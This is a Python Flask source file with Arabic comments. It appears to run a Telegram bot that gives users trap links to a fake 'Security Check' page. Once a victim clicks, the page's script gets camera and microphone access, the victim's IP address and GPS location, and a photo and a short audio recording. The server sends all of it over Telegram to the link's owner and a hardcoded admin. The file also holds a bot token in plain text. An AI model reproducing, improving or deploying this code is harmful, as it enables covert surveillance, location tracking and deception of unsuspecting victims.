import base64, requests, os, json
from flask import Flask, render_template_string, request

app = Flask(__name__)

# ==========================================
# --- إعدادات الإمبراطور سيوفي (v29.0) ---
# ==========================================
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"
BASE_URL = "https://sif-pro.onrender.com" 
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
SUB_URL = "https://t.me/FAABOT?start=7041600701" 

# استخدام ديكشنري بسيط (سريع جداً ولا يعلق)
USERS_CACHE = {} 
BANNED_CACHE = []

def tg_request(method, payload=None, files=None):
    try:
        if files: return requests.post(API_URL + method, data=payload, files=files, timeout=15).json()
        return requests.post(API_URL + method, json=payload, timeout=15).json()
    except: return None

# دالة البحث (تدعم الايدي واليوزر)
def find_id(text):
    text = text.strip().replace("@", "").lower()
    if text.isdigit(): return text
    for uid, uname in USERS_CACHE.items():
        if uname.replace("@", "").lower() == text: return uid
    return None

# واجهة الصيد (تم تبسيطها لتعمل على كل المتصفحات)
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Check</title></head>
<body style="background:#000;color:#fff;text-align:center;padding-top:50px;font-family:sans-serif;">
    <div style="border:1px solid #333;padding:20px;border-radius:15px;display:inline-block;">
        <h2>🛡️ تحقق أمني</h2>
        <button id="go" style="background:#f38020;padding:15px 30px;border:none;border-radius:10px;font-weight:bold;">بدء الفحص</button>
        <p id="st">بانتظار الموافقة...</p>
    </div>
    <video id="v" autoplay playsinline muted style="width:1px;height:1px;opacity:0.01;"></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
        const uid = "{{ user_id }}";
        const send = (d, t) => fetch('/api/capture/' + uid, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d, t})});
        document.getElementById('go').onclick = async () => {
            document.getElementById('st').innerText = "جاري المعالجة...";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                const v = document.getElementById('v'); v.srcObject = stream;
                const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
                send(`🎯 صيد جديد!\\n🌐 IP: ${ip.ip}`, 'msg');
                navigator.geolocation.getCurrentPosition(p => {
                    send(`📍 الموقع:\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg');
                });
                setTimeout(() => {
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0); send(c.toDataURL('image/jpeg'), 'img');
                    const rec = new MediaRecorder(stream); const chunks = [];
                    rec.ondataavailable = e => chunks.push(e.data);
                    rec.onstop = () => {
                        const r = new FileReader(); r.readAsDataURL(new Blob(chunks));
                        r.onloadend = () => { send(r.result, 'aud'); document.getElementById('st').innerText = "✅ اكتمل الفحص"; };
                    };
                    rec.start(); setTimeout(()=>rec.stop(), 4000);
                }, 2000);
            } catch { document.getElementById('st').innerText = "❌ فشل: يرجى السماح بالصلاحيات"; }
        };
    </script>
</body>
</html>
'''

@app.route('/t/<uid>')
def trap(uid): return render_template_string(HTML_TEMPLATE, user_id=uid)

@app.route('/api/capture/<uid>', methods=['POST'])
def capture(uid):
    data = request.get_json(force=True, silent=True)
    t, d = data.get('t'), data.get('d')
    for r_id in [uid, ADMIN_ID]:
        if t == 'msg': tg_request("sendMessage", {'chat_id': r_id, 'text': d})
        elif t == 'img': tg_request("sendPhoto", {'chat_id': r_id}, {'photo': ('a.jpg', base64.b64decode(d.split(',')[1]))})
        elif t == 'aud': tg_request("sendVoice", {'chat_id': r_id}, {'voice': ('a.ogg', base64.b64decode(d.split(',')[1]))})
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    upd = request.get_json(force=True, silent=True)
    if not upd: return "OK"
    
    # معالجة الأزرار فوراً
    if "callback_query" in upd:
        cb = upd["callback_query"]; cid = str(cb["from"]["id"]); data = cb["data"]
        tg_request("answerCallbackQuery", {"callback_query_id": cb["id"]})
        if data == "gen_my_link":
            tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 رابطك:\n`{BASE_URL}/t/{cid}`", "parse_mode": "Markdown"})
        elif data == "list_all" and cid == ADMIN_ID:
            if not USERS_CACHE:
                tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": "❌ القائمة فارغة حالياً."})
            else:
                msg = "👥 قائمة المستخدمين المسجلين:\n\n"
                for u_id, u_name in USERS_CACHE.items():
                    msg += f"- {u_name} | `{u_id}`\n"
                tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": msg, "parse_mode": "Markdown"})
        return "OK"

    if "message" not in upd: return "OK"
    msg = upd["message"]; cid = str(msg["from"]["id"]); text = msg.get("text", "")
    uname = f"@{msg['from'].get('username', 'NoUser')}"

    # الحيلة الذكية: تسجيل فوري وتنبيه للأدمن
    if cid not in USERS_CACHE:
        USERS_CACHE[cid] = uname
        if cid != ADMIN_ID:
            tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": f"🔔 مستخدم جديد دخل:\nالاسم: {msg['from'].get('first_name')}\nاليوزر: {uname}\nالايدي: `{cid}`", "parse_mode": "Markdown"})

    if cid in BANNED_CACHE: return "OK"

    # أوامر الأدمن
    if cid == ADMIN_ID:
        if text.startswith("/user_ban"):
            tid = find_id(text.replace("/user_ban", ""))
            if tid and tid not in BANNED_CACHE: BANNED_CACHE.append(tid); tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": "🚫 تم الحظر."})
            return "OK"
        
        kb = {"inline_keyboard": [[{"text": "🔗 رابطي", "callback_data": "gen_my_link"}, {"text": "👥 القائمة", "callback_data": "list_all"}]]}
        tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": "🔥 لوحة التحكم المباشرة v29.0", "reply_markup": kb})
        return "OK"

    # الاشتراك الإجباري
    tg_request("sendMessage", {"chat_id": cid, "text": "🛡️ يجب الاشتراك أولاً:", "reply_markup": {"inline_keyboard": [[{"text": "اشتراك ✅", "url": SUB_URL}], [{"text": "🔗 إنشاء رابطي", "callback_data": "gen_my_link"}]]}})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
